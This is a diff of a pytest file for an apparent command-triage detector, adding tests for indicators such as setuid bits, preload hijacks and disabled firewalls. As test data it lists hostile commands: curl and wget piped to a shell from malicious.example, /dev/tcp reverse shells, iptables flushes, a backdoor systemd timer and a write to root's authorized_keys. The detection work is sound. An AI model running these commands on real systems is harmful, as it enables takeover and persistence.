@@ -9,6 +9,7 @@ import pytest
 
 from src.indicators import (
     DEFAULT_CRITICAL_INDICATORS,
+    DEFAULT_REVIEW_INDICATORS,
     INDICATOR_PATTERNS,
     match_indicators,
     parse_critical_indicators,
@@ -41,6 +42,11 @@ grep -rIl --include="*.php" -E "eval\\(|base64_decode\\(|shell_exec\\(" $WP | he
 
 # Each attack paired with the indicator it must match.
 ATTACK_COMMANDS = [
+    ("/usr/bin/chmod u+s /bin/bash", "setuid_bit"),
+    ("/usr/bin/chmod 4755 /tmp/sh", "setuid_bit"),
+    ("/usr/bin/bash -c echo /tmp/libhook.so > /etc/ld.so.preload", "preload_hijack"),
+    ("/usr/sbin/iptables -F", "firewall_disabled"),
+    ("/usr/sbin/ufw disable", "firewall_disabled"),
     ("/usr/bin/curl -s http://malicious.example/x.sh | bash", "pipe_to_interpreter"),
     ("/usr/bin/wget -qO- http://malicious.example/i.sh | sh", "remote_fetch"),
     ("/bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1", "raw_socket_redirect"),
@@ -157,3 +163,51 @@ def test_unknown_critical_indicator_names_are_dropped() -> None:
 
 def test_critical_indicators_are_all_known() -> None:
     assert DEFAULT_CRITICAL_INDICATORS <= set(INDICATOR_PATTERNS)
+
+
+@pytest.mark.parametrize("command", [
+    "/usr/bin/bash -c printf x > /etc/systemd/system/backdoor.timer",  # persistence_config
+    "/usr/bin/tee -a /root/.ssh/authorized_keys",                       # privileged_account_config
+    "/usr/bin/bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",              # interactive_shell_spawn
+])
+def test_gate_keeps_a_dismissed_review_indicator_visible(command: str) -> None:
+    assert _apply_escalation_gate(
+        "FALSE_POSITIVE",
+        match_indicators(command),
+        DEFAULT_CRITICAL_INDICATORS,
+        DEFAULT_REVIEW_INDICATORS,
+    ) == "SUSPICIOUS"
+
+
+def test_review_indicators_never_escalate_to_malicious() -> None:
+    indicators = match_indicators("/usr/bin/crontab -l")
+    assert _apply_escalation_gate(
+        "SUSPICIOUS", indicators, DEFAULT_CRITICAL_INDICATORS, DEFAULT_REVIEW_INDICATORS
+    ) == "SUSPICIOUS"
+
+
+def test_review_indicators_leave_unrelated_dismissals_alone() -> None:
+    indicators = match_indicators("/usr/bin/apt-get install -y nginx")
+    assert _apply_escalation_gate(
+        "FALSE_POSITIVE", indicators, DEFAULT_CRITICAL_INDICATORS, DEFAULT_REVIEW_INDICATORS
+    ) == "FALSE_POSITIVE"
+
+
+def test_review_indicator_set_is_configurable() -> None:
+    assert parse_critical_indicators("persistence_config, nope", default=frozenset()) == {
+        "persistence_config"
+    }
+    assert parse_critical_indicators(None, default=DEFAULT_REVIEW_INDICATORS) == (
+        DEFAULT_REVIEW_INDICATORS
+    )
+
+
+@pytest.mark.parametrize("command", [
+    "/usr/bin/chmod 644 /etc/nginx/nginx.conf",
+    "/usr/bin/chmod 0755 /opt/app/run.sh",
+    "/usr/bin/chmod -R u+rw /srv/data",
+    "/usr/sbin/iptables -L -n",
+])
+def test_routine_permission_and_firewall_reads_are_not_flagged(command: str) -> None:
+    flagged = set(match_indicators(command)) & {"setuid_bit", "firewall_disabled"}
+    assert not flagged
